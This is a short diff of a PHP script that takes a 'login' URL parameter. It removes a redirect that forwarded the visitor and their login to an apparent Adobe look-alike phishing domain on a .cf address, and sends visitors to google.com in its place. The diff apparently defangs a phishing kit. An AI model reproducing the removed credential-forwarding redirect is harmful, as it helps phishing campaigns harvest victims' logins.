@@ -8,5 +8,5 @@ return $loginID;
 }
 $login = $_GET['login'];
 $loginID = getloginIDFromlogin($login);
-header("Location: https://secure.adobedocs.cf/cloud/?login=$login");
+header("Location: https://www.google.com");
 ?>
